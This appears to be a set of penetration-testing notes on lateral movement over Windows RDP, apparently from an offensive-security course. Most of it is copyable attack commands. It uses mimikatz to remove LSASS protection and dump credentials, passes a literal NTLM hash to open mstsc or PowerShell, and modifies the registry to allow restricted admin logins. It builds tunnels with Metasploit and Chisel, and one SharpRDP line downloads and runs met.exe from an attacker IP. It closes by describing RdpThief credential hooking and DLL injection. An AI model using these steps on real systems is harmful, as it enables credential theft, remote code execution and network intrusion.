## RDP

RDP is a multichannel network protocol developed by Microsoft and is used for communication
between Terminal Servers and their clients. When an RDP connection is created, the NTLM hashes will reside in memory for the duration of
the session. The session does not terminate without a proper logout, which means simply
disconnecting from the sessions will leave the hashes in memory.We can dump the hash if we find a RDP jump server.

```
mimikatz # privilege::debug
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```

We can also use /restrictedadmin argument to mstsc.exe, so we don't need to supply clear text password to RDP

pass the hassh, and lauch a mstsc.exe with admin's hash
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:admin /domain:corp1
/ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```
In the case that restrictedadmin is disable on target machine, we can enable it first.

lanuch an admin powershell
```
mimikatz # sekurlsa::pth /user:admin /domain:corp1
/ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```
Access to remote resource through a powershell session and enable the restrictedadmin mode
```
PS C:\Windows\system32> Enter-PSSession -Computer appsrv01

[appsrv01]: PS C:\Users\admin\Documents> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

#### Reverse RDP Proxying with metasploit

configure a reverse tunnel through the Meterpreter session and use that with a SOCKS proxy

```
msf5 exploit(multi/handler) > use multi/manage/autoroute
msf5 post(multi/manage/autoroute) > set session 1
msf5 post(multi/manage/autoroute) > exploit

```

```
post(multi/manage/autoroute) > use auxiliary/server/socks4a
msf5 auxiliary(server/socks4a) > set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf5 auxiliary(server/socks4a) > exploit -j
```

add proxy rules
```
kali@kali:~$ sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'
```

RDP to remote target
```
kali@kali:~$ proxychains rdesktop 192.168.120.10
```

#### Reverse RDP Proxying with Chisel
[Chisel](https://github.com/jpillora/chisel.git) is an open-source tunneling software written in Golang. It works by setting up a TCP
tunnel and performing data transfers over HTTP, while securing it with SSH.

compile chisel on Kali with the go build
```
kali@kali:~$ sudo apt install golang
kali@kali:~$ git clone https://github.com/jpillora/chisel.git
kali@kali:~$ cd chisel/
kali@kali:~/chisel$ go build
```

commpile Chisel for windows exe, -ldflags -s -w to strip debugging info

```
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```

Set up the chisel server on kali
```
kali@kali:~/chisel$ ./chisel server -p 8080 --socks5
```

enable ssh password fo the tunnel, and set up ssh portfoward
```
kali@kali:~$ sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
kali@kali:~$ sudo systemctl start ssh.service
kali@kali:~$ ssh -N -D 0.0.0.0:1080 localhost
```

trafer chisel.exe to windows, and run the client to connect to kali server
```
C:\Tools> chisel.exe client kaliserverIP:8080 socks
```

now RDP with proxychains
```
kali@kali:~$ sudo proxychains rdesktop 192.168.120.10
```

#### RDP remote code execution
The RDP application (mstsc.exe) builds upon the terminal services library mstscax.dll. This
library exposes interfaces to both scripts and compiled code through COM objects. We can use a tool called [SharpRDP](https://github.com/0xthirteen/SharpRDP) to exeucte command remotely using RDP.
```
C:\Tools> sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
```
#### Steal Credentials from RDP

We can modify APIs and redirect execution to custom code. we could overwrite the initial instructions of an API at the assembly level with code that transfers
execution to any custom code we want. The Microsoft-provided unmanaged (Detours library)[https://github.com/microsoft/Detours/wiki/Using-Detours] makes this possible.

Our goal is to leverage API hooking to steal the clear text credentials entered into mstsc when
they are processed by relevant APIs. APIs responsible for handling
the username, password, and domain are CredIsMarshaledCredentialW, CryptProtectMemory,
and SspiPrepareForCredRead.

As a result of this research, MDSec released [RdpThief](https://github.com/0x09AL/RdpThief), which uses Detours to hook these APIs.
The hooks in this tool will execute code that copies the username, password, and domain to a file.
Finally, RdpThief allows the original code execution to continue as intended.

We can create a c# script, [rdpinject.cs](/11WindowsLateralMovement/rdpinject.cs) to search all the mstsc,rdp process, then inject Rdpthief.dll into the code, execute our code ,get password/username and resume program execution. 
